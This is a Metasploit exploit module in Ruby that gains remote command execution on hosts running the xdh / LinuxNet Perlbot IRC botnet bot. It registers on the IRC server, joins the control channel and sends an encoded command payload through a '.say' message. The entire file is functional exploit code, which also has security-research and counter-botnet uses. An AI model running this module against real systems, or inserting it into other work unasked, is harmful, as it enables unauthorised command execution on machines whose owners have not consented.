# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module allows remote command execution on an IRC Bot developed by xdh.
          This perl bot was caught by Conor Patrick with his shellshock honeypot server
          and is categorized by Markus Zanke as an fBot (Fire & Forget - DDoS Bot). Matt
          Thayer also found this script which has a description of LinuxNet perlbot.

          The bot answers only based on the servername and nickname in the IRC message
          which is configured on the perl script thus you need to be an operator on the IRC
          network to spoof it and in order to exploit this bot or have at least the same ip
          to the config.
        },
      &#039;Author&#039;         =>
        [
          #MalwareMustDie
          &#039;Jay Turla&#039;, # msf
          &#039;Conor Patrick&#039;, # initial discovery and botnet analysis for xdh
          &#039;Matt Thayer&#039; # initial discovery for LinuxNet perlbot
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://conorpp.com/blog/a-close-look-at-an-operating-botnet/&#039; ],
          [ &#039;URL&#039;, &#039;https://twitter.com/MrMookie/status/673389285676965889&#039; ], # Matt&#039;s discovery
          [ &#039;URL&#039;, &#039;https://www.alienvault.com/open-threat-exchange/blog/elasticzombie-botnet-exploiting-elasticsearch-vulnerabilities&#039; ] # details of what an fBot is
        ],
      &#039;Platform&#039;       => %w{ unix win },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;
            }
        },
      &#039;Targets&#039;  =>
        [
          [ &#039;xdh Botnet / LinuxNet perlbot&#039;, { } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Dec 04 2015&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(6667),
        OptString.new(&#039;IRC_PASSWORD&#039;, [false, &#039;IRC Connection Password&#039;, &#039;&#039;]),
        OptString.new(&#039;NICK&#039;, [true, &#039;IRC Nickname&#039;, &#039;msfuser&#039;]), # botnet administrator name
        OptString.new(&#039;CHANNEL&#039;, [true, &#039;IRC Channel&#039;, &#039;#channel&#039;])
      ], self.class)
  end

  def check
    connect

    res = register(sock)
    if res =~ /463/ || res =~ /464/
      vprint_error("#{rhost}:#{rport}  - Connection to the IRC Server not allowed")
      return Exploit::CheckCode::Unknown
    end

    res = join(sock)
    if !res =~ /353/ && !res =~ /366/
      vprint_error("#{rhost}:#{rport} - Error joining the #{datastore[&#039;CHANNEL&#039;]} channel")
      return Exploit::CheckCode::Unknown
    end

    quit(sock)
    disconnect

    if res =~ /auth/ && res =~ /logged in/
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def send_msg(sock, data)
    sock.put(data)
    data = ""
    begin
      read_data = sock.get_once(-1, 1)
      while !read_data.nil?
        data << read_data
        read_data = sock.get_once(-1, 1)
      end
    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    data
  end

  def register(sock)
    msg = ""

    if datastore[&#039;IRC_PASSWORD&#039;] && !datastore[&#039;IRC_PASSWORD&#039;].empty?
      msg << "PASS #{datastore[&#039;IRC_PASSWORD&#039;]}\r\n"
    end

    if datastore[&#039;NICK&#039;].length > 9
      nick = rand_text_alpha(9)
      print_error("The nick is longer than 9 characters, using #{nick}")
    else
      nick = datastore[&#039;NICK&#039;]
    end

    msg << "NICK #{nick}\r\n"
    msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"

    send_msg(sock,msg)
  end

  def join(sock)
    join_msg = "JOIN #{datastore[&#039;CHANNEL&#039;]}\r\n"
    send_msg(sock, join_msg)
  end

  def xdh_command(sock)
    encoded = payload.encoded
    command_msg = "PRIVMSG #{datastore[&#039;CHANNEL&#039;]} :.say #{encoded}\r\n"
    send_msg(sock, command_msg)
  end

  def quit(sock)
    quit_msg = "QUIT :bye bye\r\n"
    sock.put(quit_msg)
  end

  def exploit
    connect

    print_status("#{rhost}:#{rport} - Registering with the IRC Server...")
    res = register(sock)
    if res =~ /463/ || res =~ /464/
      print_error("#{rhost}:#{rport} - Connection to the IRC Server not allowed")
      return
    end

    print_status("#{rhost}:#{rport} - Joining the #{datastore[&#039;CHANNEL&#039;]} channel...")
    res = join(sock)
    if !res =~ /353/ && !res =~ /366/
      print_error("#{rhost}:#{rport} - Error joining the #{datastore[&#039;CHANNEL&#039;]} channel")
      return
    end

    print_status("#{rhost}:#{rport} - Exploiting the malicious IRC bot...")
    xdh_command(sock)

    quit(sock)
    disconnect
  end

end

